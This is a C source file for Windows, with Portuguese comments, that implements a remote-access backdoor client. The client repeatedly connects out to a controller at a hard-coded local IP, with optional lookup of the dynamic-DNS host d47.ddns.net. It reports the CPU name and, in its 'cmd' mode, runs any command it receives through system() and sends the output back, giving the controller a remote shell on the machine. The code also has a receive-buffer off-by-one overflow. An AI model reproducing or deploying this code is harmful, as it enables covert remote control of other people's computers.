#pragma comment(lib,"dnsapi.lib")
#pragma comment(lib, "Ws2_32.lib")

#define WIN32_LEAN_AND_MEAN

//d47.ddns.net

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <windns.h> 


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "27015"

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

int infocpu(SOCKET ConnectSocket);
int cmd(SOCKET ConnectSocket);
int ResolverDominio(char *addr);
void CreateChildProcess(char *command);

int __cdecl main(int argc, char **argv)
{
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	char sendbuf[] = "this is a test";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;
	char addr[1024];
	char data[1024];
	DWORD buffersize = sizeof(data);
	int comando = 0;

	// A funcionar para testes caseiros usa-se o ip local
	/*
	if (ResolverDominio(addr) == 1) {
		printf("Erro a resolver DNS\n");
		system("pause");
		return 1;
	}*/
	strcpy(addr, "192.168.3.241");
	printf("%s\n",addr);

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(addr, DEFAULT_PORT, &hints, &result);//enviar a string com o ip para a estrotura de comunicaçao
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}
	// Attempt to connect to an address until one succeeds
	for (ptr = result; ; ptr = result) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			Sleep(1000);
			WSACleanup();
			//return 1;
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			printf("Unable to connect to server!\n");
			//Sleep(1000);
			//continue;
		}
		else {
			break;
		}

	}
	freeaddrinfo(result);

	//Escuta de comandos
	while (true)
	{
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("Bytes received: %d\n", iResult);
			recvbuf[iResult] = '\0';
			printf("%s\n", recvbuf);
			comando = 0;
		}
		if (strcmp(recvbuf, "infocpu") == 0) {
			infocpu(ConnectSocket);
			comando = 1;
		}
		if (strcmp(recvbuf, "cmd") == 0) {
			cmd(ConnectSocket);
			comando = 1;
		}
		if (strcmp(recvbuf, "close") == 0) {
			iResult = shutdown(ConnectSocket, SD_SEND);
			if (iResult == SOCKET_ERROR) {
				closesocket(ConnectSocket);
				WSACleanup();
				return 1;
			}
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}
		if (comando == 0) {
			sprintf(sendbuf, "Comando nao intrepertado");
			send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
		}
	}

	return 0;
}

int cmd(SOCKET ConnectSocket){
	int recvbuflen = DEFAULT_BUFLEN;
	char sendbuf[DEFAULT_BUFLEN] = "cmd mode ok";
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	char command[1024];
	char str[1024];
	FILE *file;
	int rst = 0;

	send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	while (true)
	{
		sprintf(recvbuf, "");
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		recvbuf[iResult] = '\0';
		if (strcmp(recvbuf, "end") == 0) {
			sprintf(sendbuf,"cmd mode off");
			send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
			return 0;
		}
		sprintf(sendbuf, "runing comand on client\n---> command stdout");
		send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
		sprintf(command,"%s > stdoutt.txt",recvbuf);
		// criaçao do filho

		system(command);
		Sleep(15);
		file = fopen("stdoutt.txt","r");
		do{
			sprintf(str, "");
			fscanf(file, "%[^\n]", str);
			sprintf(sendbuf, "%s\n",str);
			send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
			rst = fscanf(file, "%*c");
		} while ( rst != EOF);
		fclose(file);
		sprintf(sendbuf, "---> end command");
		send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);

	}

	return 0;
}

int infocpu(SOCKET ConnectSocket) {
	char data[DEFAULT_BUFLEN],sendbuf[DEFAULT_BUFLEN];
	DWORD buffersize = sizeof(data);

	if (RegGetValueA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", RRF_RT_REG_SZ | RRF_SUBKEY_WOW6464KEY, NULL, data, &buffersize) == ERROR_SUCCESS)
		sprintf(sendbuf, "CPU:			%s \n", data);
	else
		sprintf(sendbuf, "CPU:			Erro na leitura!\n");

	send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	return 0;
}

int ResolverDominio(char *addr) {

	DNS_STATUS status;               //Return value of  DnsQuery_A() function.
	PDNS_RECORD pDnsRecord;          //Pointer to DNS_RECORD structure.
	PIP4_ARRAY pSrvList = NULL;      //Pointer to IP4_ARRAY structure.
	char pOwnerName[1024];        //Owner name to be queried.
	IN_ADDR ipaddr;

	while (true) {
		strcpy(pOwnerName, "d47.ddns.net");

		pSrvList = (PIP4_ARRAY)LocalAlloc(LPTR, sizeof(IP4_ARRAY));
		pSrvList->AddrCount = 1;
		pSrvList->AddrArray[0] = inet_addr("8.8.8.8");

		// Calling function DnsQuery to query Host or PTR records   
		status = DnsQuery(pOwnerName,                 //Pointer to OwnerName. 
			DNS_TYPE_A,                      //Type of the record to be queried.
			DNS_QUERY_BYPASS_CACHE,     // Bypasses the resolver cache on the lookup. 
			pSrvList,                   //Contains DNS server IP address.
			&pDnsRecord,                //Resource record that contains the response.
			NULL);                     //Reserved for future use.


		if (!status) {
			//convert the Internet network address into a string
			//in Internet standard dotted format.
			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
			//printf(" O endereco IP do Host '%s' is '%s' \n", pOwnerName, inet_ntoa(ipaddr));
			sprintf(addr,"%s", inet_ntoa(ipaddr));

			// Free memory allocated for DNS records. 
			DnsRecordListFree(pDnsRecord, DnsFreeRecordListDeep);
		}

		LocalFree(pSrvList);
		system("cls");


		if (strlen(addr) >= 8)
			return 0;
	}
}

void CreateChildProcess(char *command) {
	// Create a child process that uses the previously created pipes for STDIN and STDOUT.
	char temp[] = "cmd /c dir";
	{
		//TCHAR szCmdline[] = TEXT("child");
		PROCESS_INFORMATION piProcInfo;
		STARTUPINFO siStartInfo;
		BOOL bSuccess = FALSE;

		// Set up members of the PROCESS_INFORMATION structure. 

		ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

		// Set up members of the STARTUPINFO structure. 
		// This structure specifies the STDIN and STDOUT handles for redirection.

		ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
		siStartInfo.cb = sizeof(STARTUPINFO);
		siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
		siStartInfo.hStdInput = g_hChildStd_IN_Rd;
		siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

		// Create the child process. 

		bSuccess = CreateProcess(
			NULL,
			temp,     // command line 
			NULL,          // process security attributes 
			NULL,          // primary thread security attributes 
			TRUE,          // handles are inherited 
			0,             // creation flags 
			NULL,          // use parent's environment 
			NULL,          // use parent's current directory 
			&siStartInfo,  // STARTUPINFO pointer 
			&piProcInfo);  // receives PROCESS_INFORMATION 

						   // If an error occurs, exit the application. 
		if (bSuccess == 0) {
			printf("erroo %d!!!\n", GetLastError());

		}
		else
		{
			// Close handles to the child process and its primary thread.
			// Some applications might keep these handles to monitor the status
			// of the child process, for example. 

			CloseHandle(piProcInfo.hProcess);
			CloseHandle(piProcInfo.hThread);
		}
	}
}
